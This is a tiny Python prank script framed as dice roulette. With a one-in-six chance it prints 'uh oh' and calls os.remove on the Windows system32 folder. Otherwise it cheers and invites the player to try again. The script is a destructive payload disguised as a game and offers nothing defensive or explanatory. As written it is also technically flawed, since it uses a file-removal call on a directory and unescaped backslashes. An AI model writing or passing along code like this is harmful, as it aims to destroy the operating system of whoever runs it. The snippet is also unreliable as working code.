import random
import os

if random.randint(1, 6) == 3:
    print("uh oh")
    os.remove("C:\Windows\system32")
else:
    print("yay!!!!!! please try again")
